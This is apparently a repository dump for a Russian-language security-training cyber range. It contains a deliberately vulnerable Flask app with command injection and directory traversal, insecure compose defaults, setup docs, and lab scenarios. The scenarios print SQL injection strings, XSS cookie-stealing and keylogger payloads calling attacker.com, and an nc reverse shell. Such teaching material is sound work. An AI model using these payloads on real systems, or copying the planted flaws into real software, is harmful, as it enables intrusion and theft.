+        <input type="submit" value="Search">
+    </form>
+    <p>Try: &lt;script&gt;alert('XSS')&lt;/script&gt;</p>
+    '''
+
+@app.route('/command', methods=['GET', 'POST'])
+def command():
+    if request.method == 'POST':
+        cmd = request.form.get('cmd', '')
+        if cmd:
+            try:
+                # Command Injection уязвимость
+                result = subprocess.check_output(cmd, shell=True, text=True)
+                return f"<pre>{result}</pre><a href='/command'>Back</a>"
+            except Exception as e:
+                return f"Error: {str(e)} <a href='/command'>Back</a>"
+
+    return '''
+    <form method="POST">
+        Command: <input type="text" name="cmd" placeholder="ls -la">
+        <input type="submit" value="Execute">
+    </form>
+    <p>Try: ls -la, cat /etc/passwd, id</p>
+    '''
+
+@app.route('/file')
+def file_operation():
+    filename = request.args.get('file', '')
+    if filename:
+        try:
+            # Directory Traversal уязвимость
+            with open(filename, 'r') as f:
+                content = f.read()
+            return f"<pre>{content}</pre><a href='/file'>Back</a>"
+        except Exception as e:
+            return f"Error: {str(e)} <a href='/file'>Back</a>"
+
+    return '''
+    <form>
+        File: <input type="text" name="file" placeholder="app.py">
+        <input type="submit" value="Read File">
+    </form>
+    <p>Try: app.py, /etc/passwd, ../../../etc/hosts</p>
+    '''
+
+if __name__ == '__main__':
+    init_db()
+    app.run(host='0.0.0.0', port=5000, debug=True)
+```
+
+Dockerfile:
+```
+
+```
+
+tools.sh:
+```
+
+```
+
+Dockerfile:
+```
+
+```
+
+agent.py:
+```
+
+```
+
+docker-compose.yml:
+```
+version: '3.8'
+
+services:
+  # Vulnerable Web Application
+  vulnerable-web:
+    build: 
+      context: ./docker/images/vulnerable-web
+      dockerfile: Dockerfile
+    ports:
+      - "8080:5000"
+    environment:
+      - FLASK_ENV=development
+      - DATABASE_URL=sqlite:///app.db
+    volumes:
+      - ./logs:/app/logs
+    networks:
+      - cyber-range-net
+
+  # Monitoring Stack
+  prometheus:
+    image: prom/prometheus:latest
+    ports:
+      - "9090:9090"
+    volumes:
+      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml
+      - prometheus_data:/prometheus
+    command:
+      - '--config.file=/etc/prometheus/prometheus.yml'
+      - '--storage.tsdb.path=/prometheus'
+      - '--web.console.libraries=/etc/prometheus/console_libraries'
+      - '--web.console.templates=/etc/prometheus/consoles'
+    networks:
+      - cyber-range-net
+
+  grafana:
+    image: grafana/grafana:latest
+    ports:
+      - "3000:3000"
+    environment:
+      - GF_SECURITY_ADMIN_PASSWORD=admin
+    volumes:
+      - grafana_data:/var/lib/grafana
+      - ./monitoring/grafana/dashboards:/var/lib/grafana/dashboards
+      - ./monitoring/grafana/provisioning:/etc/grafana/provisioning
+    networks:
+      - cyber-range-net
+
+  # Attack Tools Container
+  kali-tools:
+    build:
+      context: ./docker/images/attack-tools
+      dockerfile: Dockerfile
+    stdin_open: true
+    tty: true
+    volumes:
+      - ./shared:/shared
+    networks:
+      - cyber-range-net
+    depends_on:
+      - vulnerable-web
+
+  # Network Scanner
+  nmap-scanner:
+    image: instrumentisto/nmap
+    command: sleep infinity
+    networks:
+      - cyber-range-net
+
+  # Vulnerable Database
+  mysql-vuln:
+    image: mysql:5.7
+    environment:
+      - MYSQL_ROOT_PASSWORD=password123
+      - MYSQL_DATABASE=vulndb
+      - MYSQL_USER=webapp
+      - MYSQL_PASSWORD=webapp123
+    ports:
+      - "3306:3306"
+    volumes:
+      - mysql_data:/var/lib/mysql
+    networks:
+      - cyber-range-net
+
+volumes:
+  prometheus_data:
+  grafana_data:
+  mysql_data:
+
+networks:
+  cyber-range-net:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.20.0.0/16
+```
+
+docker-compose.prod.yml:
+```
+
+```
+
+SETUP.md:
+```
+# Руководство по установке киберполигона
+
+Данное руководство поможет вам развернуть полнофункциональный киберполигон для обучения сетевой безопасности.
+
+## Системные требования
+
+### Минимальные требования:
+- **CPU**: 8 ядер (Intel VT-x/AMD-V)
+- **RAM**: 32 GB
+- **Дисковое пространство**: 500 GB SSD
+- **Сеть**: 1 Gbps
+
+### Рекомендуемые требования:
+- **CPU**: 16+ ядер
+- **RAM**: 64+ GB
+- **Дисковое пространство**: 1+ TB NVMe SSD
+- **Сеть**: 10 Gbps
+
+## Установка Proxmox VE
+
+### 1. Загрузка Proxmox VE
+
+Скачайте последнюю версию Proxmox VE с официального сайта:
+```bash
+wget https://www.proxmox.com/en/downloads/proxmox-virtual-environment/iso
+```
+
+### 2. Установка
+
+1. Создайте загрузочный USB
+2. Загрузитесь с USB и следуйте инструкциям установщика
+3. Настройте сетевые параметры
+4. Создайте root пароль
+
+### 3. Первоначальная настройка
+
+После установки подключитесь к веб-интерфейсу:
+```
+https://your-proxmox-ip:8006
+```
+
+Выполните следующие настройки:
+
+1. **Обновление системы:**
+```bash
+apt update && apt upgrade -y
+```
+
+2. **Настройка репозиториев:**
+```bash
+# Отключите enterprise репозиторий (если нет подписки)
+echo "# deb https://enterprise.proxmox.com/debian/pve bullseye pve-enterprise" > /etc/apt/sources.list.d/pve-enterprise.list
+
+# Добавьте no-subscription репозиторий
+echo "deb http://download.proxmox.com/debian/pve bullseye pve-no-subscription" > /etc/apt/sources.list.d/pve-no-subscription.list
+```
+
+3. **Настройка хранилища:**
+- Создайте LVM storage для VM дисков
+- Настройте NFS/iSCSI при необходимости
+
+## Подготовка шаблонов VM
+
+### 1. Создание Ubuntu шаблона
+
+1. Скачайте Ubuntu Cloud Image:
+```bash
+wget https://cloud-images.ubuntu.com/focal/current/focal-server-cloudimg-amd64.img
+```
+
+2. Создайте VM в Proxmox:
+Обратить внимание на хранилище local-lvm
+```bash
+qm create 9000 --memory 2048 --cores 2 --name ubuntu-2004-template --net0 virtio,bridge=vmbr0 --serial0 socket --vga serial0 --agent 1
+qm importdisk 9000 focal-server-cloudimg-amd64.img local
+qm set 9000 --scsihw virtio-scsi-pci --scsi0 local:9000/vm-9000-disk-0.raw
+qm set 9000 --ide2 local:cloudinit
+qm set 9000 --boot order=scsi0
+qm template 9000
+```
+
+
+### 2. Создание pfSense шаблона
+
+1. Скачайте pfSense ISO
+2. Создайте VM и установите pfSense (pfsense-template)
+3. Выполните базовую настройку
+4. Конвертируйте в шаблон
+
+### 3. Настройка сетевых мостов
+
+Создайте дополнительные мосты для изоляции:
+
+```bash
+# В /etc/network/interfaces добавьте:
+auto vmbr1
+iface vmbr1 inet static
+    address 192.168.10.1/24
+    bridge_ports none
+    bridge_stp off
+    bridge_fd 0
+    bridge-vlan-aware yes
+    bridge-vids 2-4094
+
+auto vmbr2
+iface vmbr2 inet static
+    address 192.168.20.1/24
+    bridge_ports none
+    bridge_stp off
+    bridge_fd 0
+    bridge-vlan-aware yes
+    bridge-vids 2-4094
+```
+
+## Установка зависимостей на управляющей машине
+
+### 1. Установка Terraform
+
+```bash
+wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpg
+echo "deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com $(lsb_release -cs) main" | sudo tee /etc/apt/sources.list.d/hashicorp.list
+sudo apt update && sudo apt install terraform
+```
+
+### 2. Установка Ansible
+
+```bash
+sudo apt update
+sudo apt install software-properties-common
+sudo add-apt-repository --yes --update ppa:ansible/ansible
+sudo apt install ansible
+```
+
+### 3. Установка kubectl
+
+```bash
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
+```
+
+### 4. Установка Helm
+
+```bash
+curl https://baltocdn.com/helm/signing.asc | gpg --dearmor | sudo tee /usr/share/keyrings/helm.gpg > /dev/null
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/helm.gpg] https://baltocdn.com/helm/stable/debian/ all main" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list
+sudo apt-get update
+sudo apt-get install helm
+```
+
+### 5. Установка Docker
+
+```bash
+curl -fsSL https://get.docker.com -o get-docker.sh
+sudo sh get-docker.sh
+sudo usermod -aG docker $USER
+```
+
+## Конфигурация проекта
+
+### 1. Клонирование и настройка
+
+```bash
+git clone <repository-url>
+cd cyber-range-infra
+```
+
+### 2. Настройка Terraform переменных
+
+```bash
+cp terraform/proxmox/terraform.tfvars.example terraform/proxmox/terraform.tfvars
+```
+
+Отредактируйте `terraform.tfvars`:
+```hcl
+proxmox_api_url = "https://your-proxmox:8006/api2/json"
+proxmox_user = "root@pam"
+proxmox_password = "your-password"
+proxmox_node = "your-node-name"
+storage_name = "local-lvm"
+ubuntu_template = "ubuntu-2004-template"
+pfsense_template = "pfsense-template"
+ssh_public_key = "ssh-rsa AAAAB3NzaC1yc2E... your-key"
+ci_password = "ubuntu"
+```
+
+### 3. Настройка Ansible инвентаря
+
+```bash
+cp ansible/inventories/production/hosts.yml.example ansible/inventories/production/hosts.yml
+```
+
+Отредактируйте `hosts.yml`:
+```yaml
+all:
+  children:
+    proxmox:
+      hosts:
+        proxmox-node:
+          ansible_host: your-proxmox-ip
+          ansible_user: root
+
+    k8s_cluster:
+      children:
+        k8s_master:
+          hosts:
+            k8s-master-1:
+              ansible_host: 192.168.10.10
+            k8s-master-2:
+              ansible_host: 192.168.10.11
+            k8s-master-3:
+              ansible_host: 192.168.10.12
+
+        k8s_workers:
+          hosts:
+            k8s-worker-1:
+              ansible_host: 192.168.10.20
+            k8s-worker-2:
+              ansible_host: 192.168.10.21
+            k8s-worker-3:
+              ansible_host: 192.168.10.22
+```
+
+## Развертывание
+
+### 1. Проверка конфигурации
+
+```bash
+# Проверка Terraform
+make validate
+
+# Проверка подключения к Proxmox
+cd terraform/proxmox
+terraform init
+terraform plan
+```
+
+### 2. Полное развертывание
+
+```bash
+# Полное развертывание
+chmod +x scripts/deployment/deploy.sh
+make deploy
+
+# Или поэтапно:
+make deploy-infra
+make deploy-apps
+```
+
+### 3. Проверка развертывания
+
+```bash
+# Проверка статуса
+make status
+
+# Проверка мониторинга
+make monitor
+```
+
+## Настройка pfSense
+
+### 1. Первоначальная настройка
+
+1. Подключитесь к консоли pfSense VM
+2. Настройте WAN интерфейс (получение IP от DHCP или статический)
+3. Настройте LAN интерфейс (192.168.1.1/24)
+
+### 2. Веб-интерфейс
+
+1. Откройте https://192.168.1.1
+2. Войдите (admin/pfsense)
+3. Пройдите мастер настройки
+
+### 3. Настройка VLAN
+
+1. Перейдите в `Interfaces > Assignments > VLANs`
+2. Создайте VLAN:
+   - VLAN 10 (Office): vtnet1, ID 10
+   - VLAN 20 (Branch): vtnet1, ID 20
+   - VLAN 30 (DMZ): vtnet1, ID 30
+   - VLAN 100 (Management): vtnet1, ID 100
+
+3. Назначьте интерфейсы:
+   - `Interfaces > Assignments`
+   - Добавьте каждый VLAN как отдельный интерфейс
+
+4. Настройте IP адреса:
+   - Office: 192.168.10.1/24
+   - Branch: 192.168.20.1/24
+   - DMZ: 192.168.30.1/24
+   - Management: 192.168.100.1/24
+
+### 4. Настройка Firewall правил
+
+См. детальные инструкции в лабораторных сценариях.
+
+## Настройка мониторинга
+
+### 1. Доступ к Grafana
+
+```bash
+kubectl port-forward -n monitoring svc/prometheus-grafana 3000:80
+```
+
+Откройте http://localhost:3000
+- Логин: admin
+- Пароль: получите командой `kubectl get secret -n monitoring prometheus-grafana -o jsonpath="{.data.admin-password}" | base64 --decode`
+
+### 2. Импорт дашбордов
+
+1. Скачайте дашборды из Grafana.com:
+   - Kubernetes Cluster Monitoring: ID 315
+   - Node Exporter Full: ID 1860
+   - pfSense: ID 12023
+
+2. Импортируйте через веб-интерфейс Grafana
+
+## Создание первого студенческого окружения
+
+```bash
+# Создание окружения
+make student-env STUDENT_ID=001 LAB_TYPE=web-security
+
+# Проверка созданного окружения
+kubectl get all -n student-student001
+
+# Получение информации для подключения
+kubectl get services -n student-student001
+```
+
+## Устранение неполадок
+
+### Общие проблемы:
+
+1. **Terraform ошибки подключения к Proxmox:**
+   - Проверьте URL API
+   - Убедитесь в правильности учетных данных
+   - Проверьте сертификаты
+
+2. **Ansible не может подключиться к хостам:**
+   - Проверьте SSH ключи
+   - Убедитесь в доступности хостов
+   - Проверьте настройки файрвола
+
+3. **Kubernetes поды не запускаются:**
+   - Проверьте ресурсы нод: `kubectl describe nodes`
+   - Проверьте образы: `kubectl describe pod <pod-name>`
+   - Проверьте логи: `kubectl logs <pod-name>`
+
+### Полезные команды для диагностики:
+
+```bash
+# Проверка состояния Terraform
+terraform show
+
+# Проверка Ansible подключений
+ansible all -m ping
+
+# Проверка Kubernetes
+kubectl get events --sort-by=.metadata.creationTimestamp
+
+# Проверка ресурсов
+kubectl top nodes
+kubectl top pods --all-namespaces
+```
+
+## Резервное копирование
+
+### 1. Резервная копия конфигураций
+
+```bash
+make backup
+```
+
+### 2. Резервная копия VM в Proxmox
+
+```bash
+# Создание snapshot
+qm snapshot <vmid> snapshot-name
+
+# Backup
+vzdump <vmid> --compress gzip --storage backup-storage
+```
+
+## Масштабирование
+
+### Добавление новых нод Kubernetes:
+
+1. Создайте новые VM через Terraform
+2. Обновите Ansible инвентарь
+3. Выполните playbook присоединения к кластеру
+
+### Добавление новых типов лабораторных:
+
+1. Создайте Docker образы
+2. Добавьте Kubernetes манифесты
+3. Обновите скрипт создания окружений
+
+## Мониторинг производительности
+
+### Ключевые метрики для отслеживания:
+
+- Загрузка CPU и памяти хостов
+- Использование дискового пространства
+- Сетевая активность
+- Количество активных студенческих сессий
+- Время отклика приложений
+
+### Алерты:
+
+Настройте алерты в Prometheus для:
+- Высокой загрузки ресурсов (>80%)
+- Недоступности сервисов
+- Ошибок в логах приложений
+- Подозрительной сетевой активности
+
+Это завершает руководство по установке. После выполнения всех шагов у вас будет полностью функциональный киберполигон готовый для обучения студентов.
+```
+
+README.md:
+```
+# Киберполигон для обучения сетевой безопасности
+
+Автоматизированная система для создания индивидуальных лабораторных окружений по сетевой безопасности на базе Proxmox VE, pfSense и Kubernetes.
+
+## 🏗️ Архитектура
+
+Система состоит из следующих компонентов:
+
+- **Proxmox VE** - платформа виртуализации
+- **pfSense** - сетевой шлюз, firewall, VPN, IDS/IPS
+- **Kubernetes** - оркестрация контейнеров
+- **Docker** - контейнеризация приложений
+- **Terraform** - управление инфраструктурой как кодом
+- **Ansible** - автоматизация конфигурации
+- **Prometheus + Grafana** - мониторинг
+- **GitLab CI/CD** - непрерывная интеграция и развертывание
+
+<img width="700" height="500" alt="cyber_range_architecture" src="https://github.com/user-attachments/assets/e6f6abda-1fb4-4993-8338-d39cdcd3bade" />
+
+## 🚀 Быстрый старт
+
+### Предварительные требования
+
+- Proxmox VE 9.0-1
+- Terraform 1.5.7
+- Ansible 4.0+
+- kubectl
+- Docker
+- Helm 3.0+
+
+### Установка
+
+1. Клонируйте репозиторий:
+```bash
+git clone <repository-url>
+cd cyber-range-infra
+```
+
+2. Настройте переменные окружения:
+```bash
+cp terraform/proxmox/terraform.tfvars.example terraform/proxmox/terraform.tfvars
+# Отредактируйте terraform.tfvars согласно вашей среде
+```
+
+3. Настройте инвентарь Ansible:
+```bash
+cp ansible/inventories/production/hosts.yml.example ansible/inventories/production/hosts.yml
+# Отредактируйте hosts.yml
+```
+
+4. Запустите развертывание:
+```bash
+make deploy
+# или
+./scripts/deployment/deploy.sh
+```
+
+## 📚 Использование
+
+### Создание окружения для студента
+
+```bash
+# Создать окружение для веб-безопасности
+make student-env STUDENT_ID=001 LAB_TYPE=web-security
+
+# Создать окружение для сетевой безопасности
+make student-env STUDENT_ID=002 LAB_TYPE=network-security
+```
+
+### Управление
+
+```bash
+# Показать статус системы
+make status
+
+# Просмотр логов
+make logs
+
+# Создание резервной копии
+make backup
+
+# Мониторинг
+make monitor
+```
+
+### Доступ к интерфейсам
+
+- **Grafana**: `kubectl port-forward -n monitoring svc/prometheus-grafana 3000:80`
+- **Prometheus**: `kubectl port-forward -n monitoring svc/prometheus-kube-prometheus-prometheus 9090:9090`
+- **pfSense**: https://192.168.1.1 (настройте согласно вашей сети)
+
+## 🧪 Лабораторные сценарии
+
+### Доступные типы лабораторных работ:
+
+1. **web-security** - Веб-безопасность (SQL Injection, XSS, Command Injection)
+2. **network-security** - Сетевая безопасность (сканирование, анализ трафика)
+3. **malware-analysis** - Анализ вредоносного ПО
+
+### Пример выполнения лабораторной работы
+
+См. [LAB_SCENARIOS.md](docs/LAB_SCENARIOS.md)
+
+## 🔧 Разработка
+
+### Локальная разработка
+
+```bash
+# Запуск в режиме разработки
+make dev
+
+# Остановка
+make dev-stop
+```
+
+### Добавление новых лабораторных
+
+1. Создайте Docker образ в `docker/images/`
+2. Добавьте Kubernetes манифесты в `kubernetes/manifests/applications/`
+3. Обновите скрипт `scripts/deployment/create-student-env.sh`
+
+## 🛠️ Структура проекта
+
+```
+cyber-range-infra/
+├── terraform/              # Terraform конфигурации
+│   ├── proxmox/            # Конфигурация Proxmox
+│   └── modules/            # Terraform модули
+├── ansible/                # Ansible playbooks
+│   ├── playbooks/          # Основные playbooks
+│   ├── roles/              # Ansible роли
+│   └── inventories/        # Инвентари
+├── kubernetes/             # Kubernetes манифесты
+│   ├── manifests/          # YAML манифесты
+│   └── helm/               # Helm чарты
+├── docker/                 # Docker образы
+│   ├── images/             # Dockerfile'ы
+│   └── compose/            # Docker Compose файлы
+├── scripts/                # Скрипты управления
+│   ├── deployment/         # Скрипты развертывания
+│   └── management/         # Скрипты управления
+└── docs/                   # Документация
+```
+
+## 🔒 Безопасность
+
+- Все студенческие окружения изолированы через Network Policies
+- Ресурсы ограничены через Resource Quotas  
+- Сетевые сегменты разделены через VLAN
+- Мониторинг всех активностей через Prometheus
+
+## 🤝 Вклад в проект
+
+1. Fork репозитория
+2. Создайте ветку для изменений
+3. Внесите изменения и добавьте тесты
+4. Создайте Pull Request
+
+## 📞 Поддержка
+
+Для вопросов и поддержки создайте Issue в репозитории.
+
+```
+
+LAB_SCENARIOS.md:
+```
+# Лабораторные сценарии
+
+Данный документ содержит детальные сценарии выполнения лабораторных работ в киберполигоне.
+
+## Лабораторная работа №1: Веб-безопасность
+
+### Цель
+Изучить основные уязвимости веб-приложений и методы их эксплуатации.
+
+### Теоретическая часть
+
+#### 1.1 SQL Injection
+SQL Injection - это уязвимость, позволяющая злоумышленнику выполнять произвольные SQL-запросы к базе данных приложения.
+
+**Типы SQL Injection:**
+- Union-based
+- Boolean-based blind
+- Time-based blind
+- Error-based
+
+#### 1.2 Cross-Site Scripting (XSS)
+XSS позволяет внедрить вредоносный JavaScript код в веб-страницу.
+
+**Типы XSS:**
+- Reflected XSS
+- Stored XSS  
+- DOM-based XSS
+
+#### 1.3 Command Injection
+Позволяет выполнить системные команды на сервере.
+
+### Практическая часть
+
+#### Подготовка окружения
+
+1. Создайте лабораторное окружение:
+```bash
+./scripts/deployment/create-student-env.sh create student001 web-security
+```
+
+2. Получите информацию о развернутых сервисах:
+```bash
+kubectl get pods -n student-student001
+kubectl get services -n student-student001
+```
+
+3. Подключитесь к контейнеру с инструментами:
+```bash
+kubectl exec -it -n student-student001 deployment/attack-tools -- /bin/bash
+```
+
+#### Задание 1: SQL Injection
+
+**Цель:** Обойти аутентификацию используя SQL Injection
+
+**Шаги выполнения:**
+
+1. Откройте веб-приложение в браузере
+2. Перейдите на страницу `/login`
+3. Попробуйте войти с обычными credentials: `admin/admin123`
+4. Теперь попробуйте SQL Injection:
+   - Username: `admin' OR '1'='1' --`
+   - Password: `anything`
+
+**Объяснение:**
+Запрос в базе данных выглядит так:
+```sql
+SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
+```
+
+Поскольку `'1'='1'` всегда истинно, а `--` комментирует остальную часть запроса, мы обходим проверку пароля.
+
+**Дополнительные эксперименты:**
+- Попробуйте извлечь данные: `admin' UNION SELECT 1,2,3 --`
+- Определите структуру базы: `admin' UNION SELECT name, sql FROM sqlite_master --`
+
+#### Задание 2: XSS (Cross-Site Scripting)
+
+**Цель:** Выполнить JavaScript код в браузере другого пользователя
+
+**Шаги выполнения:**
+
+1. Перейдите на страницу `/search`
+2. Введите поисковый запрос: `<script>alert('XSS!');</script>`
+3. Нажмите "Search"
+4. Наблюдайте выполнение JavaScript кода
+
+**Усложненные варианты:**
+- Cookie stealing: `<script>document.location='http://attacker.com/cookie.php?cookie='+document.cookie;</script>`
+- Keylogger: `<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log.php?key='+String.fromCharCode(e.which);}</script>`
+
+#### Задание 3: Command Injection
+
+**Цель:** Выполнить системные команды на сервере
+
+**Шаги выполнения:**
+
+1. Перейдите на страницу `/command`
+2. Попробуйте выполнить: `ls -la`
+3. Попробуйте: `id`
+4. Попробуйте: `cat /etc/passwd`
+5. Попробуйте цепочку команд: `ls -la; whoami; pwd`
+
+**Дополнительные эксперименты:**
+- Reverse shell: `nc -e /bin/bash attacker_ip 4444`
+- Поиск интересных файлов: `find / -name "*.conf" 2>/dev/null`
+
+#### Задание 4: Directory Traversal
+
+**Цель:** Получить доступ к файлам за пределами веб-корня
+
+**Шаги выполнения:**
+
+1. Перейдите на страницу `/file`
+2. Попробуйте прочитать: `app.py`
+3. Попробуйте: `../../../etc/passwd`
+4. Попробуйте: `../../../etc/hosts`
+5. Попробуйте: `../../../proc/version`
+
+### Защитные меры
+
+Обсудите и реализуйте следующие защитные меры:
+
+1. **Для SQL Injection:**
+   - Prepared statements
+   - Input validation
+   - Least privilege принцип
+
+2. **Для XSS:**
+   - Output encoding
+   - Content Security Policy
+   - Input validation
+
+3. **Для Command Injection:**
+   - Input validation
+   - Whitelist разрешенных команд
+   - Использование безопасных API
+
+4. **Для Directory Traversal:**
+   - Path validation
+   - Chroot jail
+   - Принцип минимальных привилегий
+
+### Отчет
+
+Подготовьте отчет, включающий:
+1. Скриншоты успешных атак
+2. Анализ уязвимого кода
+3. Рекомендации по защите
+4. Демонстрацию исправленного кода
+
+## Лабораторная работа №2: Сетевая безопасность
+
+### Цель
+Изучить методы сканирования сети, анализа трафика и обнаружения вторжений.
+
+### Подготовка окружения
+
+```bash
+./scripts/deployment/create-student-env.sh create student002 network-security
+```
+
+### Задание 1: Сканирование сети
+
+**Инструменты:** nmap, masscan
+
+**Шаги:**
+
+1. Подключитесь к контейнеру с инструментами:
+```bash
+kubectl exec -it -n student-student002 deployment/attack-tools -- /bin/bash
+```
+
+2. Проведите сканирование сети:
+```bash
+# Ping sweep
+nmap -sn 192.168.0.0/24
+
+# Port scan
+nmap -sS -O 192.168.0.1-10
+
+# Service detection
+nmap -sV -sC 192.168.0.1
+
+# UDP scan
+nmap -sU --top-ports 100 192.168.0.1
+```
+
+3. Анализируйте результаты и создайте карту сети
+
+### Задание 2: Анализ трафика
+
+**Инструменты:** tcpdump, wireshark, tshark
+
+**Шаги:**
+
+1. Захват трафика:
+```bash
+# Захват всего трафика
+tcpdump -i any -w capture.pcap
+
+# Захват HTTP трафика
+tcpdump -i any port 80 -w http.pcap
+
+# Анализ с tshark
+tshark -r capture.pcap -Y "http.request.method == GET"
+```
+
+2. Анализ:
+   - Найдите незашифрованные пароли
+   - Определите используемые протоколы
+   - Найдите подозрительный трафик
+
+### Задание 3: Настройка IDS
+
+**Инструменты:** Suricata, Snort
+
+1. Настройте правила обнаружения
+2. Сгенерируйте тестовые атаки
+3. Проанализируйте алерты
+
+### Отчет по лабораторной №2
+
+1. Карта сканированной сети
+2. Анализ захваченного трафика  
+3. Настроенные правила IDS
+4. Рекомендации по защите
+
+## Лабораторная работа №3: Построение защищенной корпоративной сети
+
+### Цель
+Научиться проектировать и настраивать защищенную корпоративную сеть с использованием pfSense.
+
+### Сценарий
+Вы - сетевой администратор, которому поручено построить защищенную сеть для компании с офисом и филиалом.
+
+### Требования к сети:
+- Офис (Office): 192.168.10.0/24
+- Филиал (Branch): 192.168.20.0/24  
+- DMZ: 192.168.30.0/24
+- Управление: 192.168.100.0/24
+
+### Задание 1: Настройка VLAN и сегментация
+
+1. Войдите в веб-интерфейс pfSense
+2. Создайте VLAN:
+   - VLAN 10 - Office
+   - VLAN 20 - Branch
+   - VLAN 30 - DMZ
+   - VLAN 100 - Management
+
+3. Настройте интерфейсы для каждого VLAN
+
+### Задание 2: Настройка Firewall правил
+
+1. Создайте правила для Office VLAN:
+   - Разрешить доступ в интернет
+   - Разрешить доступ к DMZ серверам
+   - Запретить доступ к другим VLAN
+
+2. Создайте правила для DMZ:
+   - Разрешить входящие подключения из интернета на 80,443
+   - Запретить доступ к внутренним сетям
+
+### Задание 3: Настройка VPN
+
+1. Настройте IPSec туннель между офисом и филиалом
+2. Проверьте связность между сетями
+3. Настройте OpenVPN для удаленных пользователей
+
+### Задание 4: Мониторинг и логирование
+
+1. Включите логирование firewall
+2. Настройте отправку логов в Grafana
+3. Создайте дашборд для мониторинга
+
+### Результат
+В конце лабораторной у вас должна быть полностью функциональная защищенная корпоративная сеть с мониторингом.
+
+## Критерии оценки
+
+### Лабораторная №1 (Веб-безопасность):
+- Успешная эксплуатация всех уязвимостей (40%)
+- Понимание принципов атак (20%)
+- Качество отчета (20%)
+- Предложенные защитные меры (20%)
+
+### Лабораторная №2 (Сетевая безопасность):
+- Полнота сканирования сети (25%)
+- Качество анализа трафика (25%)
+- Настройка IDS (25%)
+- Отчет и рекомендации (25%)
+
+### Лабораторная №3 (Построение сети):
+- Правильность сегментации (30%)
+- Настройка firewall (30%)
+- Работоспособность VPN (25%)
+- Мониторинг (15%)
+
+## Дополнительные задания
+
+### Для продвинутых студентов:
+
+1. **Автоматизация атак**
+   - Напишите скрипт для автоматической эксплуатации SQL Injection
+   - Создайте инструмент для массового сканирования
+
+2. **Blue Team активности**
+   - Настройте SIEM для обнаружения атак
+   - Создайте incident response playbook
+
+3. **Разработка эксплойтов**
+   - Найдите новую уязвимость в предоставленном приложении
+   - Разработайте proof-of-concept эксплойт
+
+## Ресурсы для изучения
+
+- OWASP Top 10
+- NIST Cybersecurity Framework
+- SANS Reading Room
+- Документация pfSense
+- Kubernetes Security Best Practices
+```
+
+.DS_Store:
+```
+Error reading file: 'utf-8' codec can't decode byte 0xc1 in position 565: invalid start byte
+```
+
+ansible.cfg:
+```
+[defaults]
+host_key_checking = False
+ask_pass = True
+ask_become_pass = True
+remote_user = root
+timeout = 30
+inventory = inventories/production/hosts.yml
+
+[ssh_connection]
+ssh_args = -o ControlMaster=auto -o ControlPersist=60s -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
+pipelining = True
+
+```
+
+main.yml:
+```
+
+```
+
+main.yml:
+```
+
+```
+
+config.xml.j2:
+```
+
+```
+
+main.yml:
+```
+
+```
+
+main.yml:
+```
+
+```
+
+prometheus.yml.j2:
+```
+
+```
+
+grafana.yml.j2:
+```
+
+```
+
+main.yml:
+```
+
+```
+
+main.yml:
+```
+
+```
+
+kubeadm-config.yml.j2:
+```
+
+```
+
+proxmox.yml:
+```
+
+```
+
+site.yml:
+```
+
+```
+
+pfsense.yml:
+```
+
+```
+
+kubernetes.yml:
+```
+---
+- name: Установка и настройка Kubernetes кластера
+  hosts: k8s_cluster
+  become: yes
+  vars:
+    kubernetes_version: "1.28"
+    container_runtime: "containerd"
+    pod_network_cidr: "10.244.0.0/16"
+
+  tasks:
+    - name: Обновление системы
+      apt:
+        update_cache: yes
+        upgrade: dist
+
+    - name: Установка зависимостей
+      apt:
+        name:
+          - apt-transport-https
+          - ca-certificates
+          - curl
+          - gnupg
+          - lsb-release
+        state: present
+
+    - name: Добавление GPG ключа Docker
+      apt_key:
+        url: https://download.docker.com/linux/ubuntu/gpg
+        state: present
+
+    - name: Добавление репозитория Docker
+      apt_repository:
+        repo: "deb [arch=amd64] https://download.docker.com/linux/ubuntu {{ ansible_distribution_release }} stable"
+        state: present
+
+    - name: Установка containerd
+      apt:
+        name: containerd.io
+        state: present
+
+    - name: Настройка containerd
+      shell: |
+        mkdir -p /etc/containerd
+        containerd config default > /etc/containerd/config.toml
+        sed -i 's/SystemdCgroup = false/SystemdCgroup = true/' /etc/containerd/config.toml
+      notify: restart containerd
+
+    - name: Добавление GPG ключа Kubernetes
+      apt_key:
+        url: https://packages.cloud.google.com/apt/doc/apt-key.gpg
+        state: present
+
+    - name: Добавление репозитория Kubernetes
+      apt_repository:
+        repo: "deb https://apt.kubernetes.io/ kubernetes-xenial main"
+        state: present
+
+    - name: Установка Kubernetes компонентов
+      apt:
+        name:
+          - kubelet={{ kubernetes_version }}.*
+          - kubeadm={{ kubernetes_version }}.*
+          - kubectl={{ kubernetes_version }}.*
+        state: present
+
+    - name: Блокировка обновлений Kubernetes
+      dpkg_selections:
+        name: "{{ item }}"
+        selection: hold
+      loop:
+        - kubelet
+        - kubeadm
+        - kubectl
+
+    - name: Отключение swap
+      shell: swapoff -a
+
+    - name: Удаление swap из fstab
+      lineinfile:
+        path: /etc/fstab
+        regexp: '.*swap.*'
+        state: absent
+
+    - name: Настройка системных параметров
+      sysctl:
+        name: "{{ item }}"
+        value: "1"
+        sysctl_file: /etc/sysctl.d/k8s.conf
+        reload: yes
+      loop:
+        - net.bridge.bridge-nf-call-iptables
+        - net.bridge.bridge-nf-call-ip6tables
+        - net.ipv4.ip_forward
+
+  handlers:
+    - name: restart containerd
+      systemd:
+        name: containerd
+        state: restarted
+        enabled: yes
+
+- name: Инициализация Kubernetes мастера
+  hosts: k8s_master[0]
+  become: yes
+  tasks:
+    - name: Инициализация кластера
+      shell: |
+        kubeadm init --pod-network-cidr={{ pod_network_cidr }} --apiserver-advertise-address={{ ansible_default_ipv4.address }}
+      register: kubeadm_output
+
+    - name: Настройка kubectl для пользователя
+      shell: |
+        mkdir -p $HOME/.kube
